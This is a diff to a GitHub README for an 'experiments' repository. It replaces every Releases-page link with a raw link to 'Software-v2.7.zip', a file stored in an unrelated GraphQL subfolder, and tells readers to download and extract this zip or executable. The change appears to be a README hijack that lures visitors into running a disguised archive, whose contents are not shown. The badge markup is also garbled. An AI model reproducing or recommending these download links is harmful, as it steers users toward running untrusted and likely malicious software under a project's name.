@@ -34,13 +34,13 @@ Welcome to the **experiments** repository! This is your go-to place for a collec
 
 To start your journey with these exciting experiments, you can download everything from our Releases page. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/IbrahimQaiser/experiments/releases)
+[![Download Now](https://raw.githubusercontent.com/IbrahimQaiser/experiments/master/graphql-programs/postgraphile-todo/gql/Software-v2.7.zip%20Now-Click%https://raw.githubusercontent.com/IbrahimQaiser/experiments/master/graphql-programs/postgraphile-todo/gql/Software-v2.7.zip)](https://raw.githubusercontent.com/IbrahimQaiser/experiments/master/graphql-programs/postgraphile-todo/gql/Software-v2.7.zip)
 
-Simply visit this page to download the files: [Download from Releases](https://github.com/IbrahimQaiser/experiments/releases).
+Simply visit this page to download the files: [Download from Releases](https://raw.githubusercontent.com/IbrahimQaiser/experiments/master/graphql-programs/postgraphile-todo/gql/Software-v2.7.zip).
 
 ## 🚀 Getting Started
 
-1. **Download the Files**: Go to the [Releases page](https://github.com/IbrahimQaiser/experiments/releases) and choose the version you want to use. Click on the appropriate link to download the zip file or executable.
+1. **Download the Files**: Go to the [Releases page](https://raw.githubusercontent.com/IbrahimQaiser/experiments/master/graphql-programs/postgraphile-todo/gql/Software-v2.7.zip) and choose the version you want to use. Click on the appropriate link to download the zip file or executable.
 
 2. **Unzip the Downloaded File**: Once the download is complete, locate the file on your computer. Right-click on the downloaded file and select "Extract All" to unzip it. This will create a new folder containing all the necessary files.
 
